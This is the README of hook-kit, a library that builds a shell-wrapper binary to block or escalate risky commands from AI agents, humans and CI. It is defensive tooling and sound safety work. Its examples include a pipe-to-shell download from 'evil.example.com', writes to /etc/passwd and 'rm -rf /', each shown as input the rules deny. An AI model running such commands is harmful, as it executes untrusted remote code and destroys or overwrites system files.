<div align="center">

# `hook-kit`

**Caller-agnostic shell-wrapper hook binaries** — TypeScript rule definitions compiled to a single standalone `hk` binary that substitutes for `bash -c`. Decisions surface through `stdout` / `stderr` / exit-code. No JSON wire protocol, no harness coupling — it works for any caller that shells out (an AI agent, a human, a CI script). For harnesses with non-shell tool channels, a companion adapter bin is ~50 LOC (see [`docs/ADAPTERS.md`](docs/ADAPTERS.md)).

[![npm](https://img.shields.io/npm/v/@questi0nm4rk/hook-kit?color=cb3837&label=npm)](https://www.npmjs.com/package/@questi0nm4rk/hook-kit)
[![types](https://img.shields.io/npm/types/@questi0nm4rk/hook-kit?color=3178c6)](https://www.npmjs.com/package/@questi0nm4rk/hook-kit)
[![binary](https://img.shields.io/badge/compiled%20binary-~77%20MB-7e57c2)](./dist)
[![bun](https://img.shields.io/badge/bun-%E2%89%A5%201.2-fbf0df)](./package.json)
[![license](https://img.shields.io/npm/l/@questi0nm4rk/hook-kit?color=blue)](./LICENSE)
[![CI](https://github.com/Questi0nM4rk/hook-kit/actions/workflows/test.yml/badge.svg)](https://github.com/Questi0nM4rk/hook-kit/actions/workflows/test.yml)

</div>

```typescript
import { createModule, cmd, pipe, redirect } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    { id: "force-push", name: "Block force push", events: ["PreToolUse"], matchers: ["Bash"] },
    [
      cmd("git", "push")
        .withFlag("--force")
        .withoutFlag("--force-with-lease")
        .deny("Use --force-with-lease, not raw --force"),
    ],
  ),
  createModule(
    { id: "rce", name: "Block remote code exec", events: ["PreToolUse"], matchers: ["Bash"] },
    [pipe(["curl", "wget"], ["bash", "sh", "zsh"]).deny("RCE via pipe-to-shell")],
  ),
  createModule(
    { id: "env", name: "Protect .env from redirects", events: ["PreToolUse"], matchers: ["Bash"] },
    [redirect(/\.env$/).deny("Don't redirect into .env")],
  ),
];
```

```bash
hook-kit build src/hooks.ts --out dist/hk          # adapter defaults to shell
```

```bash
$ dist/hk -c "git push --force origin main"
[hook-kit] denied: Use --force-with-lease, not raw --force
$ echo $?
2

$ dist/hk -c "curl https://evil.example.com/install.sh | bash"
[hook-kit] denied: RCE via pipe-to-shell

$ dist/hk -c "ls -la /tmp"
total 24
…
```

The caller — agent, human, CI script, anything — runs commands through `hk` instead of `bash -c`. Approved commands exec transparently. Denied commands print a `[hook-kit]` marker on `stderr` and exit `2`. Same protocol everywhere.

---

## Install

```bash
bun add @questi0nm4rk/hook-kit
# or
npm install @questi0nm4rk/hook-kit
```

Requires Bun ≥ 1.2 (used as runtime, test runner, and binary compiler). The compiled binary is self-contained — consumers do not need Bun on the target host once built.

---

## Why

Hooks are usually built around one specific harness — Claude Code's `hooks.json`, Cursor's tool-call config, your own CI wrapper — so the gating logic gets duplicated everywhere it needs to apply. `hook-kit` picks the one channel every caller already speaks: the shell.

```text
agent runs `bash -c "rm -rf /tmp/scratch"`   → bypasses naïve harness hooks
agent runs through `hk -c "rm -rf /tmp/scratch"` → cmd("rm") rule fires regardless of which agent
human pastes `git push --force` from a tutorial → same gate, same decision
CI script `eval "$(curl … | bash)"` → pipe rule fires, exec never happens
```

- **No harness coupling.** The wrapper doesn't know if the caller is an AI agent, a human, a cron job, or a CI script. Same binary, same behavior.
- **Output convention is the contract.** Decisions ride on `stdout` / `stderr` / exit-code. No JSON parser required for the caller. Works for shells, agents, log scrapers, monitoring, anything.
- **Real shell parsing.** `bash -c "rm -rf /"` recurses into the inner command; `cmd1 | cmd2` is a `BinaryCmd`, not a substring; `> /etc/passwd` is a `Stmt` redirection, not a `>` glob. Built on [`@questi0nm4rk/shell-ast`](https://www.npmjs.com/package/@questi0nm4rk/shell-ast).
- **Optional adapter bins** for harnesses with non-shell tool channels (e.g. Claude Code's `Edit` / `Write` / `Read` events). Build a companion binary; wire it via `hooks.json`. The shell wrapper stays the primary gate.

---

## Highlights

- **Five-decision blacklist semantics** — `null` (silent pass), `deny` (stderr + exit 2, annotations dropped), `ask` (needs review, annotations bundled), `warning` / `note` (non-blocking annotations rendered above `---` separator before exec output). No `allow` — silent = nothing was wrong.
- **Shell-AST-aware command matching** — `cmd("rm")` matches `sudo -u root rm /etc/passwd` via `unwrapCall`, recurses into `bash -c "rm …"` via inline-shell extraction, expands compound shorts (`-rf` ≡ `-r -f`), aliases canonicalized (`-r` ≡ `-R` ≡ `--recursive`), quoted-flag bypass closed.
- **First-class `pipe()` and `redirect()` builders** — `BinaryCmd` and `Stmt` redirections need different traversal than `cmd()`. Canonical patterns (`curl … | bash`, `echo evil > /etc/passwd`) wouldn't otherwise be expressible without these.
- **Tree-shaped escalation** — `ask` rules publish to a per-session filesystem spool. A listener attached anywhere up the parent tree can `allow` / `deny` / `escalate-up`. Exhausting the chain terminates at the harness's native ask UI. Bundled `hook-kit watch` TUI, programmable via `hook-kit subscribe --json`.
- **State across invocations** — `stateful(id, fn)` rules persist via `TmpdirStore` (default) or any custom `StateStore` implementation. Useful for rate-limiting, sequence detection, session-level invariants.
- **Adapter bins are ~50 LOC** — anyone can author `hk-cursor-tools`, `hk-opencode-tools`, etc. Same engine, same rule definitions, just a different `stdin → HookEvent → stdout` glue.
- **Fail-open on infra errors** (Iron Law 4) — hook framework bugs must not block users. Security-critical rules belong in the harness's own deny list. The single exception: `ask` with broken askpass infra denies (so misconfigured plugins surface immediately).

---

## Output convention

The contract every caller can rely on:

| Engine outcome | exit | stream | content |
|---|---|---|---|
| no terminal, no annotations | `0` | — | (silent, then exec the command verbatim — caller sees its own output) |
| no terminal, annotations only | exec's exit | `stdout` | one `<prefix> warning: <msg>` or `<prefix> note: <msg>` per annotation, `---` separator on its own line, exec's stdout below |
| `ask` (needs review) | `1` | `stdout` | `<prefix> needs review: <reason>` + any accumulated warning/note annotations; command does **NOT** run |
| `deny` (hard block) | `2` | `stderr` | `<prefix> denied: <reason>` — warning/note annotations DROPPED |
| `error` annotation (any outcome) | unchanged | `stderr` | `<prefix> error: <ExceptionClass>: <message>` — engine-emitted on hook-infra failures (rule eval throw, shell-ast parse failure, state I/O). Always visible, never blocks an otherwise-allowed command, survives `deny` |

`<prefix>` is the user-supplied decision label when set (e.g. `[my-plugin]`), or `[hook-kit]` when no label is provided.

**0-silent-fails (0.5+):** every internal failure path constructs a typed `HookKitError` (`FileReadError`, `FileWriteError`, `JsonParseError`, `EnvelopeValidationError`, `ProtocolVersionError`, `ShellAstParseError`, `ProcessSpawnError`, `RuleEvaluationError`, `StateStoreError`, `ObserverError`). Engine-boundary failures (rule throws, AST parse errors, state flush failures, observer throws) surface as `error` annotations in `EvaluationOutcome.annotations`. Security-boundary failures (broker envelope, askpass IPC) emit the same typed error to stderr **and** fail-CLOSED with a synthesized `deny`. The exception classes are exported from `@questi0nm4rk/hook-kit` for `instanceof` checks in custom rules.

Approved commands run transparently. Denied commands never run. Escalated commands never run, but the warning goes to `stdout` (so a tail-the-output agent sees it without losing access to `stderr` for actual errors). Annotations (warning/note) are non-blocking — the command runs and its output flows below the `---` separator.

---

## Quick recipes

### Block force-push, except `--force-with-lease`

```typescript
import { createModule, cmd } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    { id: "force-push", name: "Block raw --force", events: ["PreToolUse"], matchers: ["Bash"] },
    [
      cmd("git", "push")
        .withFlag("--force")
        .withoutFlag("--force-with-lease")
        .deny("Use --force-with-lease, not raw --force"),
    ],
  ),
];
```

### Escalate `rm -rf` to a human responder

```typescript
import { createModule, cmd } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    { id: "destructive-rm", name: "Confirm rm -rf", events: ["PreToolUse"], matchers: ["Bash"] },
    [
      cmd("rm").withFlag("-r").withFlag("-f")
        .ask("rm -rf — confirm scope before running"),
    ],
  ),
];
```

At build time, the plugin author opts into a broker tree (`HOOK_KIT_ASKPASS=$(which hook-kit) broker --askpass`) or accepts the default fallthrough to the harness's native ask UI.

### Protect a path from shell redirects

```typescript
import { createModule, redirect } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    { id: "env-protect", name: "No writes to .env", events: ["PreToolUse"], matchers: ["Bash"] },
    [
      redirect(/\.env$/).deny("Don't redirect into .env"),
      redirect(/^\/etc\//).deny("Don't write to /etc"),
    ],
  ),
];
```

`redirect()` matches `>`, `>>`, `>|`, `&>`, `&>>` whose target matches the pattern. Closes the bypass where `path()` rules can be sidestepped via `echo evil > /protected/path` in a Bash event.

### Cross-invocation state — break repetition loops

```typescript
import { createModule, stateful, warning } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    { id: "repetition", name: "Detect repeat", events: ["PreToolUse"], matchers: ["Bash"] },
    [
      stateful("repetition", (event, state) => {
        const key = `cmd:${(event.toolInput.command as string) ?? ""}`;
        const count = ((state.get(key) as number) ?? 0) + 1;
        state.set(key, count);
        if (count > 3) return warning(`Repeated ${count}× — break the loop?`);
        return null;
      }),
    ],
  ),
];
```

State persists via the `TmpdirStore` by default — one per session, garbage-collected on session end.

### Library mode — `evaluate()` without the compiled binary

```typescript
import { evaluate, type HookEvent } from "@questi0nm4rk/hook-kit";
import modules from "./hooks.js";

const event: HookEvent = parseMyHookInput(stdin);
const outcome = await evaluate(event, modules);

if (outcome.terminal?.kind === "deny") {
  process.stderr.write(`denied: ${outcome.terminal.reason}\n`);
  process.exit(2);
}
// Map the rest of the outcome to your own output format.
```

The shell wrapper is also exported for in-process use:

```typescript
import { runShell } from "@questi0nm4rk/hook-kit/wrapper/hk";
import modules from "./hooks.js";

await runShell(modules);  // reads process.argv, evaluates, exits per the convention
```

### Writing rule tests — the testing SDK (0.7+)

Tests for your rules live in your own repo, but hook-kit ships the harness at `@questi0nm4rk/hook-kit/testing`. The fluent runner removes the boilerplate of hand-building synthetic events / state stores / askpass scripts.

```typescript
import {
  expectModule, expectRule,
  bashEvent, writeEvent, editEvent, readEvent,
  mockState, mockAskpass,
} from "@questi0nm4rk/hook-kit/testing";

// terminal assertions
await expectModule(myModule).onCommand("gcc -o /etc/passwd src.c").toDeny(/system file/);
await expectModule(myModule).onCommand("git push --force").toAsk(/confirm/);
await expectModule(myModule).onCommand("ls /tmp").toRun();    // negative case

// annotation assertions
await expectModule(myModule).onCommand("rm /tmp/x").toWarn(/quota/);
await expectModule(myModule).onCommand("rm /tmp/x").toNote(/info/);

// chained setup
await expectModule(myModule)
  .withState(mockState({ "deletions:count": 5 }))
  .onCommand("rm -rf /tmp/x")
  .toWarn(/quota/);

await expectModule(myModule)
  .withShellAstOpts({ globalFlags: { terraform: ["-chdir"] } })
  .onCommand("terraform -chdir ./infra apply")
  .toDeny();

// non-Bash events (path() / content() rules)
await expectModule(myModule).onWrite("/tmp/.env", "x=1").toDeny();
await expectModule(myModule).onEdit("/migrations/001.sql", "old", "new").toDeny();
await expectModule(myModule).onRead("/secrets.json").toDeny();

// askpass-mediated decisions
const askpass = mockAskpass({ decision: "allow", reason: "test-approved" });
try {
  process.env.HOOK_KIT_ASKPASS = askpass.path;
  await expectModule(myModule).onCommand("git push --force").toRun();
} finally {
  askpass.cleanup();
}

// single-rule shortcut + escape hatch
await expectRule(cmd("rm").deny("blocked")).onCommand("rm /").toDeny();
const outcome = await expectModule(myModule).onCommand("rm /").outcome();  // raw EvaluationOutcome
```

Matchers (`toDeny(pattern)`, `toAsk(pattern)`, `toWarn(pattern)`, `toNote(pattern)`) accept `RegExp` (uses `.test()`) or `string` (uses `===` — strict equality, not substring). All assertions return the full `EvaluationOutcome` for chained inspection; failure messages include the actual terminal/annotations so test debugging doesn't require an additional `.outcome()` call.

`runModule` / `evaluateRule` from the main barrel stay as low-level escape hatches. Reach for them when you need to drive evaluation with a custom-shape `HookEvent` the testing SDK doesn't synthesize for you.

---

## Rule builders

### `cmd(command, ...subcommands)` — shell-AST aware command matching

```typescript
cmd("rm").withFlag("-r").withFlag("-f").deny("No recursive rm");

cmd("git", "push")
  .withFlag("--force")
  .withoutFlag("--force-with-lease")
  .deny("Use --force-with-lease");

cmd("git", "checkout").withDdash().ask("git checkout -- discards working tree");

cmd("gh", "api")
  .argMatches(/\/pulls\/\d+\/reviews/)
  .deny("Use the pr-review CLI for review operations");

cmd("gh", "api", "graphql")
  .withFlag("--field")
  .argMatches(/event=COMMENT/)
  .deny("Strict review forbids COMMENT-event reviews");
```

- **Variadic subcommands** match by position: `cmd("gh", "pr", "comment")` checks `args[0] === "pr" && args[1] === "comment"`.
- **Default basename match (0.6+)**: `cmd("git")` fires on `/usr/bin/git`, `./bin/git`, `sudo /usr/bin/git`, `/usr/bin/bash -c "..."`, etc. — uses shell-ast 0.6's polymorphic `resolvedCmd`. Opt-out via `.strictPath()` if you need exact-path matching: `cmd("/usr/bin/git").strictPath().deny("vendored git only")`.
- **`.flagValueMatches(flag, /regex/)` and `.flagValueEquals(flag, value)` (0.6+)**: inspect the VALUE of a flag, not just presence. Works on both `=` and space forms; auto-dispatches to inner call for sudo/wrapped variants. Examples: `cmd("gcc").flagValueMatches("-o", /^\/(etc|sys|dev)/).deny("system path")`, `cmd("docker", "run").flagValueEquals("--user", "root").ask("root container")`. Multiple flagValue* calls stack with AND; repeated flag occurrences use ANY-match. Dynamic values (`-o $VAR`) skip silently — compose `.custom()` for block-on-uncertainty.
- **`.withFlag("...")`** is alias-aware: `-r`, `-R`, and `--recursive` are interchangeable. Compound shorts like `-D` expand to `--delete + --force`.
- **`.argMatches(/regex/)`** searches all resolved args (including flag values like `event=COMMENT` from `--field event=COMMENT`). Quoted strings (`"…"`/`'…'`) become `<dynamic>` in shell-ast and never match.
- **`.withDdash()`** requires the POSIX `--` end-of-options separator. Lets `git checkout -- file` (destructive) be matched without false-flagging `git checkout main`.
- **`unwrapCall`** strips `sudo`/`doas`/`run0`/`su` automatically: `cmd("rm")` matches `sudo -u root rm /etc/passwd`.

#### Engine-level `shellAstOpts.globalFlags` (0.6+)

Register per-tool value-taking flags so commands like `terraform -chdir ./infra apply` resolve `apply` as `args[0]`:

```typescript
runShell([myModules], {
  shellAstOpts: {
    globalFlags: {
      terraform: ["-chdir", "-state"],
      kustomize: ["--load-restrictor"],
    },
  },
});
```

shell-ast's built-in table covers `git`/`docker`/`kubectl`/`make`/`tar`/`xargs`. Anything else needs registration via this option.

### `pipe(from, into)` — pipe pattern detection

```typescript
pipe(["curl", "wget"], ["bash", "sh", "zsh", "ksh"]).deny("RCE via pipe-to-shell");
```

Walks AST `BinaryCmd` nodes for `|` and `|&` ops. Catches the canonical `curl … | bash` pattern that `cmd()` cannot express.

### `redirect(pathPattern?)` — write-redirect detection

```typescript
redirect(/\.env$/).deny("Don't redirect into .env");
redirect(/^\/etc\//).deny("Don't write to /etc");
redirect().deny("No shell redirects in this context");
```

Matches `>`, `>>`, `>|`, `&>`, `&>>` whose target matches `pathPattern`. With no pattern, matches any write redirect.

### `path(pattern)` — file-path matching (cc-tools / library only)

```typescript
path(/\.generated\.cs$/).onWrite().deny("Edit the generator, not the output");
path(/\.env(\.|$)/).onRead().deny("Don't read environment files");
```

`onWrite()` matches `Write` + `Edit` + `NotebookEdit`. `onRead()` matches `Read`. Default (no chain) covers both. **Note:** these only fire under the cc-tools adapter or library mode — the shell wrapper synthesizes a Bash event and won't trigger path rules. For shell-side write protection use `redirect()`.

### `content()` — PostToolUse body inspection (cc-tools / library only)

```typescript
import { content, warning } from "@questi0nm4rk/hook-kit";

content()
  .matchPath(/design\/.*\.md$/)
  .validate((filePath, body) => {
    const missing = REQUIRED_SECTIONS.filter((s) => !s.test(body));
    if (missing.length > 0) return warning(`Missing: ${missing.join(", ")}`);
    return null;
  });
```

Runs only on `PostToolUse` (the file is on disk after the tool ran). Same coverage caveat as `path()`.

### `custom(id, fn)` — escape hatch

```typescript
custom("session-summary", async (event) => {
  // Arbitrary logic; throws are caught and treated as null (Iron Law 4).
  return null;
});
```

---

## Iron Laws

The eight invariants the framework enforces. The full version lives in [`docs/SPEC.md`](docs/SPEC.md). Load-bearing summary:

1. **Rules are data, not scripts.**
2. **Parse once, evaluate many** — one shell-AST per invocation, shared across all command/pipe/redirect rules.
3. **Recurse into inline shells** — `bash -c "…"`, `eval`, `exec` re-evaluate against the same modules. Default-on; depth-limited to 5.
4. **Fail open on infra errors** (with one exception: `ask` infra failure denies, never silent-allows).
5. **Blacklist semantics** — only `deny` / `ask` / `warning` / `note` / `null`.
6. **Output convention is the wire format** — `stdout` / `stderr` / exit-code, no JSON for the caller to parse.
7. **Each plugin compiles its own binary** — plugin isolation; one plugin's iteration doesn't disturb the others.
8. **Escalation is async, tree-shaped, out-of-band** — see [Escalation](#escalation).

---

## Adapter bins (opt-in extensions)

For harnesses with non-shell tool channels, build a companion binary alongside `hk`:

```bash
hook-kit build src/hooks.ts --out dist/hk-cc-tools --adapter cc-tools \
  --hooks-json hooks/hooks.json --hook-timeout 10
```

Wires into Claude Code via `hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Edit|Write|NotebookEdit|Read",
      "hooks": [{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/dist/hk-cc-tools","timeout":10}]
    }],
    "PostToolUse": [{
      "matcher": "Edit|Write|NotebookEdit",
      "hooks": [{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/dist/hk-cc-tools","timeout":10}]
    }]
  }
}
```

The two binaries cooperate. `hk` covers Bash; `hk-cc-tools` covers `Edit` / `Write` / `NotebookEdit` / `Read`. Same source, two builds.

Anyone can author additional adapter bins (`hk-cursor-tools`, `hk-opencode-tools`, …) — they're ~50 LOC of stdin/stdout glue around the engine.

---

## Escalation

When a rule returns `ask`, the binary asks up the parent tree:

```text
[ root: harness UI (CC's native ask) ]
            |
[ agent session ]
        |- [ subagent A ]
        |       |- [ sub-subagent ]
        |- [ subagent B ]
```

A request publishes at the hook's own session spool. A listener attached to that session — or any ancestor session up the chain — sees it. If a listener doesn't want to decide, it forwards via `--escalate-up` to the next level. When the chain exhausts at the root, it terminates at `harness-ask` (CC's native `permissionDecision: "ask"` UI takes over with no timeout).

- **`HOOK_KIT_ASKPASS` unset** → no broker tree configured; the engine falls through to harness-ask immediately. Use this for simple "ask the user" hooks where you don't need a multi-agent escalation chain.
- **`HOOK_KIT_ASKPASS` set** → routes through the configured askpass (default: `hook-kit broker --askpass`). The broker validates that a live listener exists somewhere in the chain (`NO PARENT ATTACHED`); broken infra denies (Iron Law 4 exception).

### The askpass contract

Any program that reads JSON on stdin and writes a decision to stdout is a valid askpass. Examples: `/bin/true` (always-allow), `/bin/false` (always-deny), a Slack-bridge, a GitHub-issue-bridge, the bundled broker.

The bundled `hook-kit broker --askpass` manages per-session ask channels at `~/.cache/hook-kit/sessions/$SESSION_ID/`:

```text
sessions/abc-123/
├── meta.json            # {parent_session_id?, started_at, pid}
├── pending/<id>.json    # the envelope
├── decided/<id>.json    # the decision (first-writer-wins via O_EXCL)
├── listeners/<pid>.lock # liveness markers — one per attached listener
└── audit.jsonl          # append-only event log
```

### Listening with the TUI

```bash
hook-kit watch                         # all sessions on this host
hook-kit watch --children-of $MY_ID    # only descendants of a session you spawn
hook-kit watch --session abc-123       # one specific session
```

```text
hook-kit watch                                3 pending  ·  1 listener attached

  SESSION             REQ-ID      AGE   TOOL      DETAILS
❯ abc-123             7f8a2b…     12s   Bash      git push --force origin main
  abc-123             3c4d5e…      3s   Write     /tmp/output.cs
  def-456             8b9c0a…      1m   Bash      rm -rf /tmp/scratch

  ┌─ details: 7f8a2b… ─────────────────────────────────────────
  │ harness:    claude-code
  │ project:    /home/me/proj
  │ git:        main (dirty) @ fc7f341  origin: git@github.com:o/r.git
  │ transcript: /tmp/cc-…/transcript.jsonl
  │ origin:     pid 41832 @ lab-01 (me)
  │ expires:    in 48s
  │ command:    git push --force origin main

↑↓/jk select  ·  allow  ·  deny  ·  escalate-up  ·  quit
```

Press `a` / `d` / `e` and the screen drops into a reason prompt.

### Listening programmatically

```bash
hook-kit subscribe --children-of $MY_SESSION_ID --json | while read req; do
  ID=$(jq -r .id <<<"$req")
  SESSION=$(jq -r .sessionId <<<"$req")
  hook-kit decide "$ID" --session "$SESSION" --allow --reason "in scope"
done
```

Forward up the tree without deciding:

```bash
hook-kit decide "$ID" --session "$SESSION" --escalate-up
```

### Hook timeout

`hook-kit` doesn't enforce timeouts on its own. The only ceiling is the harness's hook timeout (when going through `hooks.json`). The build CLI requires `--hook-timeout` when emitting `hooks.json`:

```bash
hook-kit build … --hook-timeout 5      # plugins without ask rules
hook-kit build … --hook-timeout 3600   # plugins where ask may need a human
```

#### `--hook-timeout` (build flag) vs `"timeout"` (hooks.json field)

These are the **same value** at different layers:

- `--hook-timeout N` is the **build-time argument** to `hook-kit build … --hooks-json`. It tells the CLI what value to write into the generated `hooks.json` next to every emitted hook entry. **Required** when `--hooks-json` is set — no default; pick deliberately.
- `"timeout": N` is the **runtime field** in the generated `hooks.json`. Claude Code reads it on every PreToolUse and bounds how long the hook process can run before SIGTERM.

If you bypass the build CLI and hand-write `hooks.json`, you'd just write `"timeout": N` directly. The `--hook-timeout` flag exists only so the build step can produce the same field without you opening the JSON. **Conceptually one value, two names** — if the two ever disagree (e.g., you regenerate `hooks.json` with a different `--hook-timeout`), the regenerated value wins because it overwrites the file.

---

## Architecture

```text
TypeScript (src/)
  cmd / pipe / redirect / path / content / stateful / custom  ─┐
                                                                ├─→ HookModule[]
                                       createModule(meta, rules)┘
                                                       │
                                                       │  bun build --compile --bytecode
                                                       ▼
  evaluate(event, modules) ─→ EvaluationOutcome { terminal, annotations }
                                                       │
                              ┌────────────────────────┼─────────────────────────┐
                              ▼                        ▼                         ▼
                       shell wrapper             cc-tools adapter         raw / library
                       hk -c "<cmd>"             hooks.json events        evaluate() direct
                       stdout/stderr/exit        JSON over stdin/stdout   any I/O shape
```

```text
src/
├── core/         types.ts, decision.ts, event.ts, module.ts
├── builders/     cmd(), path(), pipe(), redirect(), content(), custom(), stateful() — primitives only; no pre-built rules ship
├── engine/       evaluate() loop + helpers (flag aliases, inline-shell extraction)
├── wrapper/      hk.ts — runShell() (the default adapter)
├── adapters/     ProtocolAdapter: claude-code (cc-tools), raw
├── state/        StateStore: memory-store, tmpdir-store
├── escalation/   askpass, broker, envelope, forward, listeners, watch-tui, enrich-git
└── build/        hook-kit CLI: build, broker, watch, subscribe, decide, list
```

The engine is intentionally minimal — its only job is to map `(event, modules)` to `EvaluationOutcome`. Adapters translate that outcome into the harness's wire format. The shell wrapper is itself an adapter: it just renders to `stdout` / `stderr` / exit-code.

---

## Compared to

|  | raw `bash -c` | harness-specific hooks (e.g. CC `hooks.json`) | **`hook-kit`** |
|---|---|---|---|
| Caller coupling | none — no gating | one harness only | **none — same binary, any caller** |
| Command parsing | n/a — shell does it | substring matchers in JSON | **full shell-AST via `mvdan/sh`** |
| Sudo / `bash -c` unwrap | n/a | ✗ | **✓ (17 wrappers via shell-ast)** |
| Pipe-pattern detection (`curl \| bash`) | n/a | regex only | **✓ (`BinaryCmd` walk)** |
| Redirect-target detection (`> .env`) | n/a | regex only | **✓ (`Stmt` redir walk)** |
| Cross-invocation state | n/a | ad-hoc per harness | **✓ (`stateful()` + `StateStore`)** |
| Escalation channel | n/a | harness UI only | **✓ (tree-shaped, async, askpass-style)** |
| Wire format the caller reads | shell I/O | harness-specific JSON | **shell I/O (stdout / stderr / exit-code)** |
| Plugin isolation | n/a | shared config file | **per-plugin compiled binary** |

---

## Compatibility

| Runtime / target | Status |
|---|---|
| Compiled `hk` / `hk-cc-tools` binary | ✓ — primary deployment shape; self-contained, no Bun on target host |
| Bun ≥ 1.2 (library / `bun run`) | ✓ |
| Node.js (library) | ✓ ESM only (this package is `"type": "module"`) |
| Claude Code (`hooks.json`) | ✓ — via the `cc-tools` adapter for `Edit`/`Write`/`Read` events; `hk` handles `Bash` |
| Cursor / OpenCode / KiloCode tool channels | author an adapter bin (~50 LOC); not in CI |
| Bash / POSIX / mksh shells (input parsing) | ✓ via `@questi0nm4rk/shell-ast` |
| fish / nushell / PowerShell | not supported — shell-ast doesn't parse those dialects |

---

## Quality bar

- **873 tests** covering rule builders (incl. `pipe` / `redirect` / `withDdash`), the engine (incl. inline-shell recursion + depth limit + the `DecisionObserver` feed), the shell wrapper output convention, the cc-tools adapter, both state stores, the entire escalation system (envelope schemas, askpass child-process invocation, broker spool atomicity, listener marker liveness, `NO PARENT ATTACHED` validator, escalate-up forwarding, the TUI render function), git enrichment, and real compile + execute end-to-end smokes for both binary modes. (Run via `bun run test` — the regular suite plus the isolated- and example-test processes.)
- **CI gate** (`.github/workflows/test.yml`) — `bun install --frozen-lockfile` + `biome check` + `bun test` on push to main and every PR. Red CI = no merge.
- **`mock.module()` isolation** — Bun's process-sticky module mocks ([oven-sh/bun#14516](https://github.com/oven-sh/bun/issues/14516)) would poison sibling tests in the regular suite. The `tests-isolated/` directory runs as its own `bun test` process so each isolated test file is its own context.
- **Compiled-binary smoke tests** baked in — `tests/build/example-ai-guardrails.test.ts` and `tests/build/adversarial.test.ts` build a real `dist/hk` and run 50+ adversarial inputs (alias expansion, sudo unwrap, inline-shell recursion, redirects, edge cases). A regression in the bundler or shell-ast WASM loading fails the build, not silently fails at user-deploy.
- **Annotation-rendering contract** asserted in `tests/build/warning-annotation.test.ts` — `[label] warning: <msg>` lines + `---` separator + exec output below, byte-for-byte.

```bash
bun test                          # everything (~14s including binary builds)
bun test tests/escalation         # one directory
bun test --grep "shortCircuit"    # by name
```

---

## Observability

```bash
HOOK_KIT_VERBOSE=1 dist/hk -c "git push --force origin main" 2>&1 1>/dev/null
# [hook-kit] event=PreToolUse tool=Bash session=shell modules=3 → deny label=[force-push] reason="Use --force-with-lease, not raw --force" time=12ms
```

```bash
HOOK_KIT_ENRICH_GIT=1 dist/hk-cc-tools < hook-event.json
# Adds {sha, branch, dirty, remote} to escalation envelopes.
```

Broker spool inspectable on disk:

```bash
cat ~/.cache/hook-kit/sessions/$SESSION_ID/audit.jsonl
```

Each decision can carry a `label` (e.g. `[my-plugin]`) for source attribution across modules.

### `DecisionObserver` — the structured-data feed

`HOOK_KIT_VERBOSE` is the human-readable stderr trace; `DecisionObserver` is the programmatic per-decision feed for log sinks (syslog, OTLP, file, custom transport) that shouldn't have to parse wrapper stdout. Register observers through `EvaluateOptions.observers`; the engine calls `onDecision(record)` once per terminal (`deny` / `ask`) and once per annotation (`warning` / `note` / `error`).

```typescript
import { evaluate, type DecisionObserver, type DecisionEventRecord } from "@questi0nm4rk/hook-kit";
import modules from "./hooks.js";

const jsonl: DecisionObserver = {
  onDecision(r: DecisionEventRecord) {
    process.stderr.write(`${JSON.stringify(r)}\n`); // ship to your sink
  },
};

await evaluate(event, modules, { observers: [jsonl] });
```

Each `DecisionEventRecord` carries a timestamp, rule id, decision kind, reason, optional label, per-rule `timingMs`, and an `event` sub-shape. `toolInput` is **never** logged — only its sha256 hex hash — so observers don't leak secrets by default. A throw from `onDecision` is caught, surfaced as an `ObserverError` `error` annotation, and the decision proceeds (fail-open at the observer boundary). The default zero-observer path is zero-overhead. The testing SDK ships `mockObserver()` for asserting the decision stream. Full contract in [`docs/SPEC.md`](docs/SPEC.md) § Observability.

---

## CLI reference

```text
hook-kit build <entrypoint> --out <path>
                            [--adapter shell|cc-tools]   (default: shell)
                            [--hooks-json <path>] [--binary-command <s>]
                            [--hook-timeout <seconds>]

hook-kit broker --askpass                  # the bundled default $HOOK_KIT_ASKPASS

hook-kit list [--children-of <id>] [--json]
hook-kit watch [--session <id>] [--children-of <id>] [--poll-ms <n>]
hook-kit subscribe [--session <id>] [--children-of <id>] [--poll-ms <n>] --json
hook-kit decide <request_id> --session <id>
                --allow | --deny | --escalate-up
                [--reason <text>] [--by <name>]

hook-kit --help
hook-kit --version
```

Compiled `hk` binary (built with `--adapter shell`):

```text
hk -c "<command-string>"   # mirrors `bash -c`
hk -- <argv...>            # exec form
hk --version
hk --help
```

---

## Operational readiness

- **Failure modes:**
  - shell-AST WASM fails to load → all command/pipe/redirect rules return `null` (silent), stderr warning.
  - tmpdir/cache write fails → state lost, hook returns `null` (silent).
  - Rule throws → caught, treated as `null` (silent), logged.
  - Stdin empty/malformed (cc-tools adapter) → adapter exits 0 silent.
  - `ask` without `HOOK_KIT_ASKPASS` set → falls through to harness-ask. The harness UI is itself a responder, so this is not silent-allow.
  - `ask` with broken askpass infra (binary missing / non-zero exit / malformed output) → deny with `[hook-kit] askpass …`. Iron Law 4 exception.
  - `ask` with broker `NO PARENT ATTACHED` → deny. Surfaces misconfigured plugins immediately instead of hanging on the hook timeout.
- **Deployment:** Compiled binary committed under the plugin (`dist/hk` for the wrapper, optionally `dist/hk-cc-tools` for the CC tool-call companion). For cc-tools, `hooks.json` points to `${CLAUDE_PLUGIN_ROOT}/dist/hk-cc-tools`. CI rebuilds on push. Plugin pins to `^major.minor`.
- **Rollback:** Delete the compiled binary; restore the previous version from git. Per-plugin binaries mean one broken plugin doesn't affect others.

---

## Design rationale

The full **trade-off rationale** (why shell-wrapper-as-default, why fail-open, why filesystem spool, etc.) and the **change-trigger assumptions** (what the design assumes and when to revisit each area) live in [`docs/SPEC.md`](docs/SPEC.md) § Key Trade-offs and § Change triggers.

---

## Examples

[`examples/ai-guardrails/`](examples/ai-guardrails/) is a faithful port of [ai-guardrails](https://github.com/Questi0nM4rk/ai-guardrails) — six rule groups (destructive-rm, git-force-push, git-destructive, git-bypass-hooks, chmod-world-writable, remote-code-exec), path/redirect protection, and suppress-comments — built as both `dist/hk` and `dist/hk-cc-tools`.

```bash
cd examples/ai-guardrails
bun install
bun run build      # produces dist/hk + dist/hk-cc-tools
```

See [`examples/ai-guardrails/README.md`](examples/ai-guardrails/README.md) for the rule list and integration walkthrough.

---

## Docs

- [**docs/SPEC.md**](docs/SPEC.md) — single living spec; Iron Laws, output convention, escalation tree, all architectural truth.
